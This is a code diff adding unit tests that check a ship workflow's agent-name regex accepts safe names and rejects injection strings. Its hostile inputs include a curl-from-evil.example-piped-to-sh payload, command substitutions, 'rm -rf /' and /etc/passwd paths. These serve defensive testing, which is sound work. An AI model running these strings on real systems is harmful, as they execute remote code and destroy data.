@@ -172,7 +172,23 @@ class ModelReference(unittest.TestCase):
 
 
 class ShipHook(unittest.TestCase):
+    def test_ship_validates_capability_agent_before_shell(self):
+        content = (guard.WORKFLOWS/"ship.md").read_text(encoding="utf-8")
+        self.assertEqual([], guard.ship_hook_violations(content))
+        shape = guard.ship_gate_shape(content)
+        self.assertIsNotNone(shape, "ship.md must publish the validation shape")
+        for ok in ("mempalace-curator", "code-reviewer", "my.agent_v2", "a"):
+            self.assertTrue(shape.fullmatch(ok), "gate must accept %r" % ok)
+        hostile = ['x"; curl http://evil.example/p | sh; #', "x$(id)", "x`id`", "x; rm -rf /", "x && whoami",
+                   "x | tee /etc/passwd", "x\nrm -rf /", "$IFS", "../../etc/passwd", ""]
+        for bad in hostile:
+            self.assertIsNone(shape.fullmatch(bad), "gate must reject %r" % bad)
 
+    def test_ship_hook_violations_for_fixtures(self):
+        good = "check `^[A-Za-z0-9][A-Za-z0-9._-]*$` IN-CONTEXT, before any shell use.\n"
+        self.assertEqual([], guard.ship_hook_violations(good))
+        self.assertEqual(2, len(guard.ship_hook_violations("nothing here\n")))
+        self.assertEqual(1, len(guard.ship_hook_violations(good + 'HOOK_AGENT="$x"\n')))
 
     @unittest.skip("MODEL_PROFILES table and resolve-model unknown_agent flag absent in this repo "
                    "(resolve-model raises agent-not-found for an unknown agent)")
